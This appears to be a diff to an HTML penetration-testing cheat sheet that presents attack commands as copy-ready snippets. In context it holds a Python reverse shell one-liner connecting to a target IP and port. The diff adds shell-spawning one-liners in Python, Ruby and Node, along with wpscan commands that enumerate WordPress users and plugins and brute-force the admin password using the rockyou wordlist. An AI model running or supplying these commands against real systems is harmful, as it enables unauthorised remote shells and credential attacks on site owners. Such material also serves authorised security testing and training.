@@ -221,7 +221,10 @@
     <p id="command12">$<span id="commandText12">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$target_ip",$target_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><button id="copyButton12">Copy</button> <button id="encodeButton">URL encode</button></p>
 
     <h3>Spawn Shell.</h3>
+    <p>A Read Eval Print Loop</p>
     <p id="command12">$<span id="commandText12">python3 -c 'import pty; pty.spawn("/bin/bash")'</span><button id="copyButton12">Copy</button></p>
+    <p id="command12">$<span id="commandText12">ruby -e 'require "irb"; IRB.start(__FILE__)' -e 'exec "/bin/sh"'</span><button id="copyButton12">Copy</button></p>
+    <p id="command12">$<span id="commandText12">node -e "require('child_process').spawn('/bin/bash', {stdio: 'inherit'});"'</span><button id="copyButton12">Copy</button></p>
 
     <button id="expandButton">More</button>
     <div id="expandableContent" style="display: none;">
@@ -232,7 +235,7 @@
     <h4>Meterpreter.</h4>
     <h4>Sliver.</h4>
 
-    <h2>CMS</h2>
+    <h2>CMS.</h2>
     <p>For more details, see <a href="cms/cms.html">CMS</a>.</p>
     <h3>WordPress.</h3>
     <p>For more details, see <a href="cms/wordpress.html">WordPress</a>.</p>
@@ -240,6 +243,15 @@
     <p id="command13">$<span id="commandText13">wpscan --url $target_domain</span><button id="copyButton13">Copy</button></p>
     <p>enumerate users.</p>
     <p id="command14">$<span id="commandText14">wpscan --url $target_domain --enumerate u</span><button id="copyButton14">Copy</button></p>
+    <p>enumerate plugins.</p>
+    <p id="command16">$<span id="commandText16">wpscan --url $target_domain --enumerate p</span><button id="copyButton16">Copy</button></p>
+    <p>brute force password attack.</p>
+    <p id="command15">$<span id="commandText15">wpscan --url $target_domain --wordlist /usr/share/wordlists/rockyou.txt --username admin</span><button id="copyButton15">Copy</button></p>
+    <p>Wordlists: 
+      <select>
+        <option value="wordlist1">/usr/share/wordlists/rockyou.txt</option>
+      </select>
+    </p>
     <h3>Drupal.</h3>
     <h3>Joomla.</h3>
 
